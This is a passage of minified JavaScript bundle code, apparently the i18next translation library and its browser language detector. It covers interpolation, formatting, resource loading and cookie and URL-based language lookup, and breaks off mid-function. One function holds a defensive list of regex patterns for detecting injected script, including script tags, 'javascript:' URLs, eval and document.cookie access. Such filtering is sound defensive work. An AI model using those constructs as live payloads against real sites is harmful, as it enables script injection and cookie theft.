          , h = ((y = s == null ? void 0 : s.interpolation) == null ? void 0 : y.skipOnVariables) !== void 0 ? s.interpolation.skipOnVariables : this.options.interpolation.skipOnVariables;
        return [{
            regex: this.regexpUnescape,
            safeValue: v => Js(v)
        }, {
            regex: this.regexp,
            safeValue: v => this.escapeValue ? Js(this.escape(v)) : Js(v)
        }].forEach(v => {
            for (l = 0; i = v.regex.exec(t); ) {
                const k = i[1].trim();
                if (o = c(k),
                o === void 0)
                    if (typeof m == "function") {
                        const f = m(t, i, s);
                        o = K(f) ? f : ""
                    } else if (s && Object.prototype.hasOwnProperty.call(s, k))
                        o = "";
                    else if (h) {
                        o = i[0];
                        continue
                    } else
                        this.logger.warn(`missed to pass in variable ${k} for interpolating ${t}`),
                        o = "";
                else
                    !K(o) && !this.useRawValueToEscape && (o = Pc(o));
                const p = v.safeValue(o);
                if (t = t.replace(i[0], p),
                h ? (v.regex.lastIndex += o.length,
                v.regex.lastIndex -= i[0].length) : v.regex.lastIndex = 0,
                l++,
                l >= this.maxReplaces)
                    break
            }
        }
        ),
        t
    }
    nest(t, n, r={}) {
        let s, i, o;
        const l = (u, c) => {
            const m = this.nestingOptionsSeparator;
            if (u.indexOf(m) < 0)
                return u;
            const h = u.split(new RegExp(`${m}[ ]*{`));
            let x = `{${h[1]}`;
            u = h[0],
            x = this.interpolate(x, o);
            const y = x.match(/'/g)
              , v = x.match(/"/g);
            (((y == null ? void 0 : y.length) ?? 0) % 2 === 0 && !v || v.length % 2 !== 0) && (x = x.replace(/'/g, '"'));
            try {
                o = JSON.parse(x),
                c && (o = {
                    ...c,
                    ...o
                })
            } catch (k) {
                return this.logger.warn(`failed parsing options string in nesting for key ${u}`, k),
                `${u}${m}${x}`
            }
            return o.defaultValue && o.defaultValue.indexOf(this.prefix) > -1 && delete o.defaultValue,
            u
        }
        ;
        for (; s = this.nestingRegexp.exec(t); ) {
            let u = [];
            o = {
                ...r
            },
            o = o.replace && !K(o.replace) ? o.replace : o,
            o.applyPostProcessor = !1,
            delete o.defaultValue;
            const c = /{.*}/.test(s[1]) ? s[1].lastIndexOf("}") + 1 : s[1].indexOf(this.formatSeparator);
            if (c !== -1 && (u = s[1].slice(c).split(this.formatSeparator).map(m => m.trim()).filter(Boolean),
            s[1] = s[1].slice(0, c)),
            i = n(l.call(this, s[1].trim(), o), o),
            i && s[0] === t && !K(i))
                return i;
            K(i) || (i = Pc(i)),
            i || (this.logger.warn(`missed to resolve ${s[1]} for nesting ${t}`),
            i = ""),
            u.length && (i = u.reduce( (m, h) => this.format(m, h, r.lng, {
                ...r,
                interpolationkey: s[1].trim()
            }), i.trim())),
            t = t.replace(s[0], i),
            this.regexp.lastIndex = 0
        }
        return t
    }
}
const lx = e => {
    let t = e.toLowerCase().trim();
    const n = {};
    if (e.indexOf("(") > -1) {
        const r = e.split("(");
        t = r[0].toLowerCase().trim();
        const s = r[1].substring(0, r[1].length - 1);
        t === "currency" && s.indexOf(":") < 0 ? n.currency || (n.currency = s.trim()) : t === "relativetime" && s.indexOf(":") < 0 ? n.range || (n.range = s.trim()) : s.split(";").forEach(o => {
            if (o) {
                const [l,...u] = o.split(":")
                  , c = u.join(":").trim().replace(/^'+|'+$/g, "")
                  , m = l.trim();
                n[m] || (n[m] = c),
                c === "false" && (n[m] = !1),
                c === "true" && (n[m] = !0),
                isNaN(c) || (n[m] = parseInt(c, 10))
            }
        }
        )
    }
    return {
        formatName: t,
        formatOptions: n
    }
}
  , Lc = e => {
    const t = {};
    return (n, r, s) => {
        let i = s;
        s && s.interpolationkey && s.formatParams && s.formatParams[s.interpolationkey] && s[s.interpolationkey] && (i = {
            ...i,
            [s.interpolationkey]: void 0
        });
        const o = r + JSON.stringify(i);
        let l = t[o];
        return l || (l = e(Ma(r), s),
        t[o] = l),
        l(n)
    }
}
  , cx = e => (t, n, r) => e(Ma(n), r)(t);
class ux {
    constructor(t={}) {
        this.logger = lt.create("formatter"),
        this.options = t,
        this.init(t)
    }
    init(t, n={
        interpolation: {}
    }) {
        this.formatSeparator = n.interpolation.formatSeparator || ",";
        const r = n.cacheInBuiltFormats ? Lc : cx;
        this.formats = {
            number: r( (s, i) => {
                const o = new Intl.NumberFormat(s,{
                    ...i
                });
                return l => o.format(l)
            }
            ),
            currency: r( (s, i) => {
                const o = new Intl.NumberFormat(s,{
                    ...i,
                    style: "currency"
                });
                return l => o.format(l)
            }
            ),
            datetime: r( (s, i) => {
                const o = new Intl.DateTimeFormat(s,{
                    ...i
                });
                return l => o.format(l)
            }
            ),
            relativetime: r( (s, i) => {
                const o = new Intl.RelativeTimeFormat(s,{
                    ...i
                });
                return l => o.format(l, i.range || "day")
            }
            ),
            list: r( (s, i) => {
                const o = new Intl.ListFormat(s,{
                    ...i
                });
                return l => o.format(l)
            }
            )
        }
    }
    add(t, n) {
        this.formats[t.toLowerCase().trim()] = n
    }
    addCached(t, n) {
        this.formats[t.toLowerCase().trim()] = Lc(n)
    }
    format(t, n, r, s={}) {
        const i = n.split(this.formatSeparator);
        if (i.length > 1 && i[0].indexOf("(") > 1 && i[0].indexOf(")") < 0 && i.find(l => l.indexOf(")") > -1)) {
            const l = i.findIndex(u => u.indexOf(")") > -1);
            i[0] = [i[0], ...i.splice(1, l)].join(this.formatSeparator)
        }
        return i.reduce( (l, u) => {
            var h;
            const {formatName: c, formatOptions: m} = lx(u);
            if (this.formats[c]) {
                let x = l;
                try {
                    const y = ((h = s == null ? void 0 : s.formatParams) == null ? void 0 : h[s.interpolationkey]) || {}
                      , v = y.locale || y.lng || s.locale || s.lng || r;
                    x = this.formats[c](l, v, {
                        ...m,
                        ...s,
                        ...y
                    })
                } catch (y) {
                    this.logger.warn(y)
                }
                return x
            } else
                this.logger.warn(`there was no format function for ${c}`);
            return l
        }
        , t)
    }
}
const dx = (e, t) => {
    e.pending[t] !== void 0 && (delete e.pending[t],
    e.pendingCount--)
}
;
class mx extends xs {
    constructor(t, n, r, s={}) {
        var i, o;
        super(),
        this.backend = t,
        this.store = n,
        this.services = r,
        this.languageUtils = r.languageUtils,
        this.options = s,
        this.logger = lt.create("backendConnector"),
        this.waitingReads = [],
        this.maxParallelReads = s.maxParallelReads || 10,
        this.readingCalls = 0,
        this.maxRetries = s.maxRetries >= 0 ? s.maxRetries : 5,
        this.retryTimeout = s.retryTimeout >= 1 ? s.retryTimeout : 350,
        this.state = {},
        this.queue = [],
        (o = (i = this.backend) == null ? void 0 : i.init) == null || o.call(i, r, s.backend, s)
    }
    queueLoad(t, n, r, s) {
        const i = {}
          , o = {}
          , l = {}
          , u = {};
        return t.forEach(c => {
            let m = !0;
            n.forEach(h => {
                const x = `${c}|${h}`;
                !r.reload && this.store.hasResourceBundle(c, h) ? this.state[x] = 2 : this.state[x] < 0 || (this.state[x] === 1 ? o[x] === void 0 && (o[x] = !0) : (this.state[x] = 1,
                m = !1,
                o[x] === void 0 && (o[x] = !0),
                i[x] === void 0 && (i[x] = !0),
                u[h] === void 0 && (u[h] = !0)))
            }
            ),
            m || (l[c] = !0)
        }
        ),
        (Object.keys(i).length || Object.keys(o).length) && this.queue.push({
            pending: o,
            pendingCount: Object.keys(o).length,
            loaded: {},
            errors: [],
            callback: s
        }),
        {
            toLoad: Object.keys(i),
            pending: Object.keys(o),
            toLoadLanguages: Object.keys(l),
            toLoadNamespaces: Object.keys(u)
        }
    }
    loaded(t, n, r) {
        const s = t.split("|")
          , i = s[0]
          , o = s[1];
        n && this.emit("failedLoading", i, o, n),
        !n && r && this.store.addResourceBundle(i, o, r, void 0, void 0, {
            skipCopy: !0
        }),
        this.state[t] = n ? -1 : 2,
        n && r && (this.state[t] = 0);
        const l = {};
        this.queue.forEach(u => {
            Qf(u.loaded, [i], o),
            dx(u, t),
            n && u.errors.push(n),
            u.pendingCount === 0 && !u.done && (Object.keys(u.loaded).forEach(c => {
                l[c] || (l[c] = {});
                const m = u.loaded[c];
                m.length && m.forEach(h => {
                    l[c][h] === void 0 && (l[c][h] = !0)
                }
                )
            }
            ),
            u.done = !0,
            u.errors.length ? u.callback(u.errors) : u.callback())
        }
        ),
        this.emit("loaded", l),
        this.queue = this.queue.filter(u => !u.done)
    }
    read(t, n, r, s=0, i=this.retryTimeout, o) {
        if (!t.length)
            return o(null, {});
        if (this.readingCalls >= this.maxParallelReads) {
            this.waitingReads.push({
                lng: t,
                ns: n,
                fcName: r,
                tried: s,
                wait: i,
                callback: o
            });
            return
        }
        this.readingCalls++;
        const l = (c, m) => {
            if (this.readingCalls--,
            this.waitingReads.length > 0) {
                const h = this.waitingReads.shift();
                this.read(h.lng, h.ns, h.fcName, h.tried, h.wait, h.callback)
            }
            if (c && m && s < this.maxRetries) {
                setTimeout( () => {
                    this.read.call(this, t, n, r, s + 1, i * 2, o)
                }
                , i);
                return
            }
            o(c, m)
        }
          , u = this.backend[r].bind(this.backend);
        if (u.length === 2) {
            try {
                const c = u(t, n);
                c && typeof c.then == "function" ? c.then(m => l(null, m)).catch(l) : l(null, c)
            } catch (c) {
                l(c)
            }
            return
        }
        return u(t, n, l)
    }
    prepareLoading(t, n, r={}, s) {
        if (!this.backend)
            return this.logger.warn("No backend was added via i18next.use. Will not load resources."),
            s && s();
        K(t) && (t = this.languageUtils.toResolveHierarchy(t)),
        K(n) && (n = [n]);
        const i = this.queueLoad(t, n, r, s);
        if (!i.toLoad.length)
            return i.pending.length || s(),
            null;
        i.toLoad.forEach(o => {
            this.loadOne(o)
        }
        )
    }
    load(t, n, r) {
        this.prepareLoading(t, n, {}, r)
    }
    reload(t, n, r) {
        this.prepareLoading(t, n, {
            reload: !0
        }, r)
    }
    loadOne(t, n="") {
        const r = t.split("|")
          , s = r[0]
          , i = r[1];
        this.read(s, i, "read", void 0, void 0, (o, l) => {
            o && this.logger.warn(`${n}loading namespace ${i} for language ${s} failed`, o),
            !o && l && this.logger.log(`${n}loaded namespace ${i} for language ${s}`, l),
            this.loaded(t, o, l)
        }
        )
    }
    saveMissing(t, n, r, s, i, o={}, l= () => {}
    ) {
        var u, c, m, h, x;
        if ((c = (u = this.services) == null ? void 0 : u.utils) != null && c.hasLoadedNamespace && !((h = (m = this.services) == null ? void 0 : m.utils) != null && h.hasLoadedNamespace(n))) {
            this.logger.warn(`did not save key "${r}" as the namespace "${n}" was not yet loaded`, "This means something IS WRONG in your setup. You access the t function before i18next.init / i18next.loadNamespace / i18next.changeLanguage was done. Wait for the callback or Promise to resolve before accessing it!!!");
            return
        }
        if (!(r == null || r === "")) {
            if ((x = this.backend) != null && x.create) {
                const y = {
                    ...o,
                    isUpdate: i
                }
                  , v = this.backend.create.bind(this.backend);
                if (v.length < 6)
                    try {
                        let k;
                        v.length === 5 ? k = v(t, n, r, s, y) : k = v(t, n, r, s),
                        k && typeof k.then == "function" ? k.then(p => l(null, p)).catch(l) : l(null, k)
                    } catch (k) {
                        l(k)
                    }
                else
                    v(t, n, r, s, l, y)
            }
            !t || !t[0] || this.store.addResource(t[0], n, r, s)
        }
    }
}
const Oc = () => ({
    debug: !1,
    initAsync: !0,
    ns: ["translation"],
    defaultNS: ["translation"],
    fallbackLng: ["dev"],
    fallbackNS: !1,
    supportedLngs: !1,
    nonExplicitSupportedLngs: !1,
    load: "all",
    preload: !1,
    simplifyPluralSuffix: !0,
    keySeparator: ".",
    nsSeparator: ":",
    pluralSeparator: "_",
    contextSeparator: "_",
    partialBundledLanguages: !1,
    saveMissing: !1,
    updateMissing: !1,
    saveMissingTo: "fallback",
    saveMissingPlurals: !0,
    missingKeyHandler: !1,
    missingInterpolationHandler: !1,
    postProcess: !1,
    postProcessPassResolved: !1,
    returnNull: !1,
    returnEmptyString: !0,
    returnObjects: !1,
    joinArrays: !1,
    returnedObjectHandler: !1,
    parseMissingKeyHandler: !1,
    appendNamespaceToMissingKey: !1,
    appendNamespaceToCIMode: !1,
    overloadTranslationOptionHandler: e => {
        let t = {};
        if (typeof e[1] == "object" && (t = e[1]),
        K(e[1]) && (t.defaultValue = e[1]),
        K(e[2]) && (t.tDescription = e[2]),
        typeof e[2] == "object" || typeof e[3] == "object") {
            const n = e[3] || e[2];
            Object.keys(n).forEach(r => {
                t[r] = n[r]
            }
            )
        }
        return t
    }
    ,
    interpolation: {
        escapeValue: !0,
        format: e => e,
        prefix: "{{",
        suffix: "}}",
        formatSeparator: ",",
        unescapePrefix: "-",
        nestingPrefix: "$t(",
        nestingSuffix: ")",
        nestingOptionsSeparator: ",",
        maxReplaces: 1e3,
        skipOnVariables: !0
    },
    cacheInBuiltFormats: !0
})
  , Fc = e => {
    var t, n;
    return K(e.ns) && (e.ns = [e.ns]),
    K(e.fallbackLng) && (e.fallbackLng = [e.fallbackLng]),
    K(e.fallbackNS) && (e.fallbackNS = [e.fallbackNS]),
    ((n = (t = e.supportedLngs) == null ? void 0 : t.indexOf) == null ? void 0 : n.call(t, "cimode")) < 0 && (e.supportedLngs = e.supportedLngs.concat(["cimode"])),
    typeof e.initImmediate == "boolean" && (e.initAsync = e.initImmediate),
    e
}
  , lr = () => {}
  , hx = e => {
    Object.getOwnPropertyNames(Object.getPrototypeOf(e)).forEach(n => {
        typeof e[n] == "function" && (e[n] = e[n].bind(e))
    }
    )
}
;
class Ua extends xs {
    constructor(t={}, n) {
        if (super(),
        this.options = Fc(t),
        this.services = {},
        this.logger = lt,
        this.modules = {
            external: []
        },
        hx(this),
        n && !this.isInitialized && !t.isClone) {
            if (!this.options.initAsync)
                return this.init(t, n),
                this;
            setTimeout( () => {
                this.init(t, n)
            }
            , 0)
        }
    }
    init(t={}, n) {
        this.isInitializing = !0,
        typeof t == "function" && (n = t,
        t = {}),
        t.defaultNS == null && t.ns && (K(t.ns) ? t.defaultNS = t.ns : t.ns.indexOf("translation") < 0 && (t.defaultNS = t.ns[0]));
        const r = Oc();
        this.options = {
            ...r,
            ...this.options,
            ...Fc(t)
        },
        this.options.interpolation = {
            ...r.interpolation,
            ...this.options.interpolation
        },
        t.keySeparator !== void 0 && (this.options.userDefinedKeySeparator = t.keySeparator),
        t.nsSeparator !== void 0 && (this.options.userDefinedNsSeparator = t.nsSeparator);
        const s = c => c ? typeof c == "function" ? new c : c : null;
        if (!this.options.isClone) {
            this.modules.logger ? lt.init(s(this.modules.logger), this.options) : lt.init(null, this.options);
            let c;
            this.modules.formatter ? c = this.modules.formatter : c = ux;
            const m = new Mc(this.options);
            this.store = new Ic(this.options.resources,this.options);
            const h = this.services;
            h.logger = lt,
            h.resourceStore = this.store,
            h.languageUtils = m,
            h.pluralResolver = new ix(m,{
                prepend: this.options.pluralSeparator,
                simplifyPluralSuffix: this.options.simplifyPluralSuffix
            }),
            this.options.interpolation.format && this.options.interpolation.format !== r.interpolation.format && this.logger.warn("init: you are still using the legacy format function, please use the new approach: https://www.i18next.com/translation-function/formatting"),
            c && (!this.options.interpolation.format || this.options.interpolation.format === r.interpolation.format) && (h.formatter = s(c),
            h.formatter.init && h.formatter.init(h, this.options),
            this.options.interpolation.format = h.formatter.format.bind(h.formatter)),
            h.interpolator = new ox(this.options),
            h.utils = {
                hasLoadedNamespace: this.hasLoadedNamespace.bind(this)
            },
            h.backendConnector = new mx(s(this.modules.backend),h.resourceStore,h,this.options),
            h.backendConnector.on("*", (y, ...v) => {
                this.emit(y, ...v)
            }
            ),
            this.modules.languageDetector && (h.languageDetector = s(this.modules.languageDetector),
            h.languageDetector.init && h.languageDetector.init(h, this.options.detection, this.options)),
            this.modules.i18nFormat && (h.i18nFormat = s(this.modules.i18nFormat),
            h.i18nFormat.init && h.i18nFormat.init(this)),
            this.translator = new Qr(this.services,this.options),
            this.translator.on("*", (y, ...v) => {
                this.emit(y, ...v)
            }
            ),
            this.modules.external.forEach(y => {
                y.init && y.init(this)
            }
            )
        }
        if (this.format = this.options.interpolation.format,
        n || (n = lr),
        this.options.fallbackLng && !this.services.languageDetector && !this.options.lng) {
            const c = this.services.languageUtils.getFallbackCodes(this.options.fallbackLng);
            c.length > 0 && c[0] !== "dev" && (this.options.lng = c[0])
        }
        !this.services.languageDetector && !this.options.lng && this.logger.warn("init: no languageDetector is used and no lng is defined"),
        ["getResource", "hasResourceBundle", "getResourceBundle", "getDataByLanguage"].forEach(c => {
            this[c] = (...m) => this.store[c](...m)
        }
        ),
        ["addResource", "addResources", "addResourceBundle", "removeResourceBundle"].forEach(c => {
            this[c] = (...m) => (this.store[c](...m),
            this)
        }
        );
        const l = na()
          , u = () => {
            const c = (m, h) => {
                this.isInitializing = !1,
                this.isInitialized && !this.initializedStoreOnce && this.logger.warn("init: i18next is already initialized. You should call init just once!"),
                this.isInitialized = !0,
                this.options.isClone || this.logger.log("initialized", this.options),
                this.emit("initialized", this.options),
                l.resolve(h),
                n(m, h)
            }
            ;
            if (this.languages && !this.isInitialized)
                return c(null, this.t.bind(this));
            this.changeLanguage(this.options.lng, c)
        }
        ;
        return this.options.resources || !this.options.initAsync ? u() : setTimeout(u, 0),
        l
    }
    loadResources(t, n=lr) {
        var i, o;
        let r = n;
        const s = K(t) ? t : this.language;
        if (typeof t == "function" && (r = t),
        !this.options.resources || this.options.partialBundledLanguages) {
            if ((s == null ? void 0 : s.toLowerCase()) === "cimode" && (!this.options.preload || this.options.preload.length === 0))
                return r();
            const l = []
              , u = c => {
                if (!c || c === "cimode")
                    return;
                this.services.languageUtils.toResolveHierarchy(c).forEach(h => {
                    h !== "cimode" && l.indexOf(h) < 0 && l.push(h)
                }
                )
            }
            ;
            s ? u(s) : this.services.languageUtils.getFallbackCodes(this.options.fallbackLng).forEach(m => u(m)),
            (o = (i = this.options.preload) == null ? void 0 : i.forEach) == null || o.call(i, c => u(c)),
            this.services.backendConnector.load(l, this.options.ns, c => {
                !c && !this.resolvedLanguage && this.language && this.setResolvedLanguage(this.language),
                r(c)
            }
            )
        } else
            r(null)
    }
    reloadResources(t, n, r) {
        const s = na();
        return typeof t == "function" && (r = t,
        t = void 0),
        typeof n == "function" && (r = n,
        n = void 0),
        t || (t = this.languages),
        n || (n = this.options.ns),
        r || (r = lr),
        this.services.backendConnector.reload(t, n, i => {
            s.resolve(),
            r(i)
        }
        ),
        s
    }
    use(t) {
        if (!t)
            throw new Error("You are passing an undefined module! Please check the object you are passing to i18next.use()");
        if (!t.type)
            throw new Error("You are passing a wrong module! Please check the object you are passing to i18next.use()");
        return t.type === "backend" && (this.modules.backend = t),
        (t.type === "logger" || t.log && t.warn && t.error) && (this.modules.logger = t),
        t.type === "languageDetector" && (this.modules.languageDetector = t),
        t.type === "i18nFormat" && (this.modules.i18nFormat = t),
        t.type === "postProcessor" && ym.addPostProcessor(t),
        t.type === "formatter" && (this.modules.formatter = t),
        t.type === "3rdParty" && this.modules.external.push(t),
        this
    }
    setResolvedLanguage(t) {
        if (!(!t || !this.languages) && !(["cimode", "dev"].indexOf(t) > -1)) {
            for (let n = 0; n < this.languages.length; n++) {
                const r = this.languages[n];
                if (!(["cimode", "dev"].indexOf(r) > -1) && this.store.hasLanguageSomeTranslations(r)) {
                    this.resolvedLanguage = r;
                    break
                }
            }
            !this.resolvedLanguage && this.languages.indexOf(t) < 0 && this.store.hasLanguageSomeTranslations(t) && (this.resolvedLanguage = t,
            this.languages.unshift(t))
        }
    }
    changeLanguage(t, n) {
        this.isLanguageChangingTo = t;
        const r = na();
        this.emit("languageChanging", t);
        const s = l => {
            this.language = l,
            this.languages = this.services.languageUtils.toResolveHierarchy(l),
            this.resolvedLanguage = void 0,
            this.setResolvedLanguage(l)
        }
          , i = (l, u) => {
            u ? this.isLanguageChangingTo === t && (s(u),
            this.translator.changeLanguage(u),
            this.isLanguageChangingTo = void 0,
            this.emit("languageChanged", u),
            this.logger.log("languageChanged", u)) : this.isLanguageChangingTo = void 0,
            r.resolve( (...c) => this.t(...c)),
            n && n(l, (...c) => this.t(...c))
        }
          , o = l => {
            var m, h;
            !t && !l && this.services.languageDetector && (l = []);
            const u = K(l) ? l : l && l[0]
              , c = this.store.hasLanguageSomeTranslations(u) ? u : this.services.languageUtils.getBestMatchFromCodes(K(l) ? [l] : l);
            c && (this.language || s(c),
            this.translator.language || this.translator.changeLanguage(c),
            (h = (m = this.services.languageDetector) == null ? void 0 : m.cacheUserLanguage) == null || h.call(m, c)),
            this.loadResources(c, x => {
                i(x, c)
            }
            )
        }
        ;
        return !t && this.services.languageDetector && !this.services.languageDetector.async ? o(this.services.languageDetector.detect()) : !t && this.services.languageDetector && this.services.languageDetector.async ? this.services.languageDetector.detect.length === 0 ? this.services.languageDetector.detect().then(o) : this.services.languageDetector.detect(o) : o(t),
        r
    }
    getFixedT(t, n, r) {
        const s = (i, o, ...l) => {
            let u;
            typeof o != "object" ? u = this.options.overloadTranslationOptionHandler([i, o].concat(l)) : u = {
                ...o
            },
            u.lng = u.lng || s.lng,
            u.lngs = u.lngs || s.lngs,
            u.ns = u.ns || s.ns,
            u.keyPrefix !== "" && (u.keyPrefix = u.keyPrefix || r || s.keyPrefix);
            const c = this.options.keySeparator || ".";
            let m;
            return u.keyPrefix && Array.isArray(i) ? m = i.map(h => `${u.keyPrefix}${c}${h}`) : m = u.keyPrefix ? `${u.keyPrefix}${c}${i}` : i,
            this.t(m, u)
        }
        ;
        return K(t) ? s.lng = t : s.lngs = t,
        s.ns = n,
        s.keyPrefix = r,
        s
    }
    t(...t) {
        var n;
        return (n = this.translator) == null ? void 0 : n.translate(...t)
    }
    exists(...t) {
        var n;
        return (n = this.translator) == null ? void 0 : n.exists(...t)
    }
    setDefaultNamespace(t) {
        this.options.defaultNS = t
    }
    hasLoadedNamespace(t, n={}) {
        if (!this.isInitialized)
            return this.logger.warn("hasLoadedNamespace: i18next was not initialized", this.languages),
            !1;
        if (!this.languages || !this.languages.length)
            return this.logger.warn("hasLoadedNamespace: i18n.languages were undefined or empty", this.languages),
            !1;
        const r = n.lng || this.resolvedLanguage || this.languages[0]
          , s = this.options ? this.options.fallbackLng : !1
          , i = this.languages[this.languages.length - 1];
        if (r.toLowerCase() === "cimode")
            return !0;
        const o = (l, u) => {
            const c = this.services.backendConnector.state[`${l}|${u}`];
            return c === -1 || c === 0 || c === 2
        }
        ;
        if (n.precheck) {
            const l = n.precheck(this, o);
            if (l !== void 0)
                return l
        }
        return !!(this.hasResourceBundle(r, t) || !this.services.backendConnector.backend || this.options.resources && !this.options.partialBundledLanguages || o(r, t) && (!s || o(i, t)))
    }
    loadNamespaces(t, n) {
        const r = na();
        return this.options.ns ? (K(t) && (t = [t]),
        t.forEach(s => {
            this.options.ns.indexOf(s) < 0 && this.options.ns.push(s)
        }
        ),
        this.loadResources(s => {
            r.resolve(),
            n && n(s)
        }
        ),
        r) : (n && n(),
        Promise.resolve())
    }
    loadLanguages(t, n) {
        const r = na();
        K(t) && (t = [t]);
        const s = this.options.preload || []
          , i = t.filter(o => s.indexOf(o) < 0 && this.services.languageUtils.isSupportedCode(o));
        return i.length ? (this.options.preload = s.concat(i),
        this.loadResources(o => {
            r.resolve(),
            n && n(o)
        }
        ),
        r) : (n && n(),
        Promise.resolve())
    }
    dir(t) {
        var s, i;
        if (t || (t = this.resolvedLanguage || (((s = this.languages) == null ? void 0 : s.length) > 0 ? this.languages[0] : this.language)),
        !t)
            return "rtl";
        try {
            const o = new Intl.Locale(t);
            if (o && o.getTextInfo) {
                const l = o.getTextInfo();
                if (l && l.direction)
                    return l.direction
            }
        } catch {}
        const n = ["ar", "shu", "sqr", "ssh", "xaa", "yhd", "yud", "aao", "abh", "abv", "acm", "acq", "acw", "acx", "acy", "adf", "ads", "aeb", "aec", "afb", "ajp", "apc", "apd", "arb", "arq", "ars", "ary", "arz", "auz", "avl", "ayh", "ayl", "ayn", "ayp", "bbz", "pga", "he", "iw", "ps", "pbt", "pbu", "pst", "prp", "prd", "ug", "ur", "ydd", "yds", "yih", "ji", "yi", "hbo", "men", "xmn", "fa", "jpr", "peo", "pes", "prs", "dv", "sam", "ckb"]
          , r = ((i = this.services) == null ? void 0 : i.languageUtils) || new Mc(Oc());
        return t.toLowerCase().indexOf("-latn") > 1 ? "ltr" : n.indexOf(r.getLanguagePartFromCode(t)) > -1 || t.toLowerCase().indexOf("-arab") > 1 ? "rtl" : "ltr"
    }
    static createInstance(t={}, n) {
        return new Ua(t,n)
    }
    cloneInstance(t={}, n=lr) {
        const r = t.forkResourceStore;
        r && delete t.forkResourceStore;
        const s = {
            ...this.options,
            ...t,
            isClone: !0
        }
          , i = new Ua(s);
        if ((t.debug !== void 0 || t.prefix !== void 0) && (i.logger = i.logger.clone(t)),
        ["store", "services", "language"].forEach(l => {
            i[l] = this[l]
        }
        ),
        i.services = {
            ...this.services
        },
        i.services.utils = {
            hasLoadedNamespace: i.hasLoadedNamespace.bind(i)
        },
        r) {
            const l = Object.keys(this.store.data).reduce( (u, c) => (u[c] = {
                ...this.store.data[c]
            },
            u[c] = Object.keys(u[c]).reduce( (m, h) => (m[h] = {
                ...u[c][h]
            },
            m), u[c]),
            u), {});
            i.store = new Ic(l,s),
            i.services.resourceStore = i.store
        }
        return i.translator = new Qr(i.services,s),
        i.translator.on("*", (l, ...u) => {
            i.emit(l, ...u)
        }
        ),
        i.init(s, n),
        i.translator.options = s,
        i.translator.backendConnector.services.utils = {
            hasLoadedNamespace: i.hasLoadedNamespace.bind(i)
        },
        i
    }
    toJSON() {
        return {
            options: this.options,
            store: this.store,
            language: this.language,
            languages: this.languages,
            resolvedLanguage: this.resolvedLanguage
        }
    }
}
const be = Ua.createInstance();
be.createInstance = Ua.createInstance;
be.createInstance;
be.dir;
be.init;
be.loadResources;
be.reloadResources;
be.use;
be.changeLanguage;
be.getFixedT;
be.t;
be.exists;
be.setDefaultNamespace;
be.hasLoadedNamespace;
be.loadNamespaces;
be.loadLanguages;
const {slice: px, forEach: fx} = [];
function xx(e) {
    return fx.call(px.call(arguments, 1), t => {
        if (t)
            for (const n in t)
                e[n] === void 0 && (e[n] = t[n])
    }
    ),
    e
}
function gx(e) {
    return typeof e != "string" ? !1 : [/<\s*script.*?>/i, /<\s*\/\s*script\s*>/i, /<\s*img.*?on\w+\s*=/i, /<\s*\w+\s*on\w+\s*=.*?>/i, /javascript\s*:/i, /vbscript\s*:/i, /expression\s*\(/i, /eval\s*\(/i, /alert\s*\(/i, /document\.cookie/i, /document\.write\s*\(/i, /window\.location/i, /innerHTML/i].some(n => n.test(e))
}
const Kc = /^[\u0009\u0020-\u007e\u0080-\u00ff]+$/
  , yx = function(e, t) {
    const r = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : {
        path: "/"
    }
      , s = encodeURIComponent(t);
    let i = `${e}=${s}`;
    if (r.maxAge > 0) {
        const o = r.maxAge - 0;
        if (Number.isNaN(o))
            throw new Error("maxAge should be a Number");
        i += `; Max-Age=${Math.floor(o)}`
    }
    if (r.domain) {
        if (!Kc.test(r.domain))
            throw new TypeError("option domain is invalid");
        i += `; Domain=${r.domain}`
    }
    if (r.path) {
        if (!Kc.test(r.path))
            throw new TypeError("option path is invalid");
        i += `; Path=${r.path}`
    }
    if (r.expires) {
        if (typeof r.expires.toUTCString != "function")
            throw new TypeError("option expires is invalid");
        i += `; Expires=${r.expires.toUTCString()}`
    }
    if (r.httpOnly && (i += "; HttpOnly"),
    r.secure && (i += "; Secure"),
    r.sameSite)
        switch (typeof r.sameSite == "string" ? r.sameSite.toLowerCase() : r.sameSite) {
        case !0:
            i += "; SameSite=Strict";
            break;
        case "lax":
            i += "; SameSite=Lax";
            break;
        case "strict":
            i += "; SameSite=Strict";
            break;
        case "none":
            i += "; SameSite=None";
            break;
        default:
            throw new TypeError("option sameSite is invalid")
        }
    return r.partitioned && (i += "; Partitioned"),
    i
}
  , _c = {
    create(e, t, n, r) {
        let s = arguments.length > 4 && arguments[4] !== void 0 ? arguments[4] : {
            path: "/",
            sameSite: "strict"
        };
        n && (s.expires = new Date,
        s.expires.setTime(s.expires.getTime() + n * 60 * 1e3)),
        r && (s.domain = r),
        document.cookie = yx(e, t, s)
    },
    read(e) {
        const t = `${e}=`
          , n = document.cookie.split(";");
        for (let r = 0; r < n.length; r++) {
            let s = n[r];
            for (; s.charAt(0) === " "; )
                s = s.substring(1, s.length);
            if (s.indexOf(t) === 0)
                return s.substring(t.length, s.length)
        }
        return null
    },
    remove(e, t) {
        this.create(e, "", -1, t)
    }
};
var vx = {
    name: "cookie",
    lookup(e) {
        let {lookupCookie: t} = e;
        if (t && typeof document < "u")
            return _c.read(t) || void 0
    },
    cacheUserLanguage(e, t) {
        let {lookupCookie: n, cookieMinutes: r, cookieDomain: s, cookieOptions: i} = t;
        n && typeof document < "u" && _c.create(n, e, r, s, i)
    }
}
  , Sx = {
    name: "querystring",
    lookup(e) {
        var r;
        let {lookupQuerystring: t} = e, n;
        if (typeof window < "u") {
            let {search: s} = window.location;
            !window.location.search && ((r = window.location.hash) == null ? void 0 : r.indexOf("?")) > -1 && (s = window.location.hash.substring(window.location.hash.indexOf("?")));
            const o = s.substring(1).split("&");
            for (let l = 0; l < o.length; l++) {
                const u = o[l].indexOf("=");
                u > 0 && o[l].substring(0, u) === t && (n = o[l].substring(u + 1))
            }
        }
        return n
    }
}
  , wx = {
    name: "hash",
    lookup(e) {
        var s;
        let {lookupHash: t, lookupFromHashIndex: n} = e, r;
        if (typeof window < "u") {
            const {hash: i} = window.location;
            if (i && i.length > 2) {
                const o = i.substring(1);
                if (t) {
                    const l = o.split("&");
                    for (let u = 0; u < l.length; u++) {
                        const c = l[u].indexOf("=");
                        c > 0 && l[u].substring(0, c) === t && (r = l[u].substring(c + 1))
                    }
                }
                if (r)
                    return r;
                if (!r && n > -1) {
                    const l = i.match(/\/([a-zA-Z-]*)/g);
                    return Array.isArray(l) ? (s = l[typeof n == "number" ? n : 0]) == null ? void 0 : s.replace("/", "") : void 0
                }
